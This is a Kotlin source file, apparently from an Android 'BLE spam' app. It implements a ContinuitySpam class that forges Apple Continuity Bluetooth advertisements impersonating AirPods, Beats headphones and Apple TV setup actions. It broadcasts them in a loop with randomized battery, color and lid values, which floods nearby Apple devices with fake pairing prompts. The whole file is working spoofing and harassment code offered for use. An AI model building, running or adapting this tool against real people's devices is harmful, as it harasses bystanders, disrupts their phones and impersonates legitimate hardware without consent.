package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import android.os.Build
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class ContinuitySpam(private val type: ContinuityType, var crashMode: Boolean = false) : Spammer {

    private var _blinkRunnable: Runnable? = null
    private var blinkRunnable: Runnable? = null

    private var _isSpamming = false

    lateinit var devices: Array<ContinuityDevice>

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()

    companion object {
        private const val COLOR_KEY_DEFAULT = "00"
        private const val CONTINUITY_TYPE = "07"
        private const val PAYLOAD_SIZE = "19"
        private const val STATUS = "55"

        private val DEVICE_COLORS = HashMap<String, Array<String>>().apply {
            put("0E20", arrayOf("00"))
            put("0220", arrayOf("00"))
            put("0F20", arrayOf("00"))
            put("1320", arrayOf("00"))
            put("1420", arrayOf("00"))
            put("0A20", arrayOf("00", "02", "03", "0F", "11"))
            put("1020", arrayOf("00", "01"))
            put("0620", arrayOf("00", "01", "06", "07", "08", "09", "0E", "0F"))
            put("0320", arrayOf("00", "01", "0B", "0C", "0D"))
            put("0B20", arrayOf("00", "02", "03", "04", "05", "06"))
            put("0C20", arrayOf("00", "01"))
            put("1120", arrayOf("00", "01", "02", "03", "04"))

        }

        private val DEVICE_DATA = HashMap<String, String>().apply {
            put("0E20", "AirPods Pro")
            put("0A20", "AirPods Max")
            put("0220", "AirPods")
            put("0F20", "AirPods 2nd Gen")
            put("1320", "AirPods 3rd Gen")
            put("1420", "AirPods Pro 2nd Gen")
            put("1020", "Beats Flex")
            put("0620", "Beats Solo 3")
            put("0320", "Powerbeats 3")
            put("0B20", "Powerbeats Pro")
            put("0C20", "Beats Solo Pro")
            put("1120", "Beats Studio Buds")

        }
    }

    init {
        devices = when (type) {
            ContinuityType.DEVICE -> arrayOf(
                ContinuityDevice("0E20", "AirPods Pro", ContinuityType.DEVICE),
                ContinuityDevice("0A20", "AirPods Max", ContinuityType.DEVICE),
                ContinuityDevice("0220", "AirPods", ContinuityType.DEVICE),
                ContinuityDevice("0F20", "AirPods 2nd Gen", ContinuityType.DEVICE),
                ContinuityDevice("1320", "AirPods 3rd Gen", ContinuityType.DEVICE),
                ContinuityDevice("1420", "AirPods Pro 2nd Gen", ContinuityType.DEVICE),
                ContinuityDevice("1020", "Beats Flex", ContinuityType.DEVICE),
                ContinuityDevice("0620", "Beats Solo 3", ContinuityType.DEVICE),
                ContinuityDevice("0320", "Powerbeats 3", ContinuityType.DEVICE),
                ContinuityDevice("0B20", "Powerbeats Pro", ContinuityType.DEVICE),
                ContinuityDevice("0C20", "Beats Solo Pro", ContinuityType.DEVICE),
                ContinuityDevice("1120", "Beats Studio Buds", ContinuityType.DEVICE)
            )
            ContinuityType.ACTION -> arrayOf(
                ContinuityDevice("0520", "Apple TV Setup", ContinuityType.ACTION),
                ContinuityDevice("0020", "Apple TV Pair", ContinuityType.ACTION),
                ContinuityDevice("0220", "Apple TV New User", ContinuityType.ACTION),
                ContinuityDevice("0320", "Apple TV AppleID Setup", ContinuityType.ACTION),
                ContinuityDevice("0420", "Apple TV Wireless Audio Sync", ContinuityType.ACTION),
                ContinuityDevice("0620", "Apple TV Homekit Setup", ContinuityType.ACTION),
                ContinuityDevice("0820", "Apple TV Keyboard", ContinuityType.ACTION),
                ContinuityDevice("0920", "Apple TV Connecting to Network", ContinuityType.ACTION),
                ContinuityDevice("1320", "Setup New Phone", ContinuityType.ACTION),
                ContinuityDevice("0B20", "Transfer Phone Number", ContinuityType.ACTION),
                ContinuityDevice("0C20", "TV Color Balance", ContinuityType.ACTION)
            )
            ContinuityType.NOTYOURDEVICE -> arrayOf(
                ContinuityDevice("0055", "Not Your Device", ContinuityType.NOTYOURDEVICE),
                ContinuityDevice("0030", "Not Your Device 2", ContinuityType.NOTYOURDEVICE)
            )
        }
    }

    private fun toHexByte(b: Int): String = String.format("%02X", b and 0xFF)

    private fun getRandomBudsBatteryLevelHex(): String {
        val level = ((0..9).random() shl 4) + (0..9).random() and 0xFF
        return toHexByte(level)
    }

    private fun getRandomChargingCaseBatteryLevelHex(): String {
        val level = (((0..7).random() % 8) shl 4) + ((0..9).random() % 10) and 0xFF
        return toHexByte(level)
    }

    private fun getRandomLidOpenCounterHex(): String {
        val counter = (0..255).random()
        return toHexByte(counter)
    }

    private fun pickRandomColorForDevice(deviceIdNoPrefix: String): String {
        return DEVICE_COLORS[deviceIdNoPrefix]?.randomOrNull() ?: COLOR_KEY_DEFAULT
    }

    private fun buildContinuityPayload(prefixHex: String, deviceIdHex: String, colorHex: String?): String {
        val buds = getRandomBudsBatteryLevelHex()
        val charging = getRandomChargingCaseBatteryLevelHex()
        val lid = getRandomLidOpenCounterHex()
        val color = colorHex ?: COLOR_KEY_DEFAULT

        return buildString {
            append(prefixHex)
            append(deviceIdHex)
            append(color)
            append(buds)
            append(charging)
            append(lid)
            append(STATUS)
        }
    }

    override fun start() {
        executor.execute @androidx.annotation.RequiresPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) {
            val bluetoothAdvertiser = BluetoothAdvertiser()
            _isSpamming = true
            var loop = 0

            while (loop <= Helper.MAX_LOOP && _isSpamming) {
                val device = devices.random()
                val payload = buildContinuityPayload(CONTINUITY_TYPE + PAYLOAD_SIZE, device.value, pickRandomColorForDevice(device.value))
                val data = AdvertiseData.Builder()
                    .addManufacturerData(0x004C, Helper.convertHexToByteArray(payload))
                    .build()

                val scanResponse = AdvertiseData.Builder()
                    .addManufacturerData(0x004C, Helper.convertHexToByteArray("0000000000000000000000000000"))
                    .build()

                bluetoothAdvertiser.advertise(data, scanResponse)
                blinkRunnable?.run()
                Thread.sleep(Helper.getRandomDelay())
                loop++
            }
            _isSpamming = false
        }
    }

    override fun isSpamming(): Boolean = _isSpamming

    override fun stop() {
        _isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? {
        return blinkRunnable
    }
}
